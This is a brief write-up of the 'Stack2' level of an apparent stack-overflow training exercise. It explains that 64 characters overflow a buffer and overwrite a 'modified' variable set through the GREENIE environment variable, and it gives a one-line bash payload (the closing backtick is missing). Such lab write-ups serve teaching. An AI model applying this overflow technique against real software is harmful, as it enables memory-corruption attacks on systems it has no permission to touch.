#### Stack2

---

As in "stack1", you need to overflow the buffer with 64 characters, and then you can write the variable "modified", but in this case you have a environment variable.

```bash
export GREENIE=`python -c 'print("X"*64 + "\x0a\x0d\x0a\x0d")
```
